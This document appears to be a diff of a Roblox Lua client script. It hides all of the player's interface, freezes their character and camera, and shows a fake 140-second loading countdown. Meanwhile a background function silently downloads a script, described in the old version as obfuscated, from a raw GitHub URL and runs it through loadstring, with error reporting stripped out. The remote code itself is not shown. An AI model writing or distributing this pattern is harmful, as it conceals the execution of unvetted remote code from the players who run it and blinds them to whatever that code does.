@@ -1,60 +1,81 @@
 local player = game.Players.LocalPlayer
 local countdownTime = 140
+local uis = game:GetService("UserInputService")
 
--- Hide all GUI at the start
+-- === STEP 1: Block movement + UI ===
 for _, gui in pairs(player:WaitForChild("PlayerGui"):GetChildren()) do
     if gui:IsA("ScreenGui") then
         gui.Enabled = false
     end
 end
 
--- Create fullscreen black GUI (Loading Screen)
-local loadingGui = Instance.new("ScreenGui")
+local function freezeCharacter()
+    local char = player.Character or player.CharacterAdded:Wait()
+    if char:FindFirstChildOfClass("Humanoid") then
+        char:FindFirstChildOfClass("Humanoid").WalkSpeed = 0
+        char:FindFirstChildOfClass("Humanoid").JumpPower = 0
+    end
+end
+
+local cam = workspace.CurrentCamera
+cam.CameraType = Enum.CameraType.Scriptable
+
+-- === STEP 2: Create fullscreen loading GUI ===
+local loadingGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 loadingGui.Name = "FullLoadingScreen"
 loadingGui.IgnoreGuiInset = true
 loadingGui.ResetOnSpawn = false
-loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
 loadingGui.DisplayOrder = 9999
-loadingGui.Parent = player.PlayerGui
 
-local background = Instance.new("Frame")
-background.Size = UDim2.new(1, 0, 1, 0)
-background.Position = UDim2.new(0, 0, 0, 0)
-background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-background.BorderSizePixel = 0
-background.Parent = loadingGui
+local bg = Instance.new("Frame", loadingGui)
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.Size = UDim2.new(1, 0, 1, 0)
 
-local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(0.4, 0, 0.1, 0)
-loadingText.Position = UDim2.new(0.5, -200, 0.5, -25)
-loadingText.AnchorPoint = Vector2.new(0.5, 0.5)
-loadingText.BackgroundTransparency = 1
-loadingText.TextColor3 = Color3.new(1, 1, 1)
-loadingText.TextScaled = true
-loadingText.Font = Enum.Font.SourceSansBold
-loadingText.Text = "Loading: " .. countdownTime
-loadingText.Parent = background
+local title = Instance.new("TextLabel", bg)
+title.Size = UDim2.new(1, 0, 0.1, 0)
+title.Position = UDim2.new(0, 0, 0.3, 0)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextScaled = true
+title.Font = Enum.Font.SourceSansBold
+title.Text = "Loading, please wait..."
 
--- === Run GitHub-hosted obfuscated script in the background immediately ===
+local label = Instance.new("TextLabel", bg)
+label.Size = UDim2.new(1, 0, 0.1, 0)
+label.Position = UDim2.new(0, 0, 0.5, 0)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.new(1, 1, 1)
+label.TextScaled = true
+label.Font = Enum.Font.SourceSans
+label.Text = "Loading: " .. countdownTime
+
+-- === STEP 3: Load your GitHub script silently ===
 spawn(function()
-    -- Load the obfuscated script from your GitHub
-    local success, err = pcall(function()
-        -- Here is the updated raw GitHub URL
+    pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/boomboxmisscal/test/refs/heads/main/test"))()
     end)
-    if not success then
-        warn("Script failed to load: " .. err)
-    end
 end)
 
--- Countdown timer for loading screen
+-- === STEP 4: Run countdown ===
+freezeCharacter()
+
 for i = countdownTime, 1, -1 do
-    loadingText.Text = "Loading: " .. i
+    label.Text = "Loading: " .. i
     wait(1)
 end
 
--- Remove the loading screen and restore all GUI after countdown
+-- === STEP 5: Restore everything ===
 loadingGui:Destroy()
+
+local char = player.Character or player.CharacterAdded:Wait()
+local humanoid = char:FindFirstChildOfClass("Humanoid")
+if humanoid then
+    humanoid.WalkSpeed = 16
+    humanoid.JumpPower = 50
+end
+
+cam.CameraType = Enum.CameraType.Custom
+
 for _, gui in pairs(player.PlayerGui:GetChildren()) do
     if gui:IsA("ScreenGui") then
         gui.Enabled = true
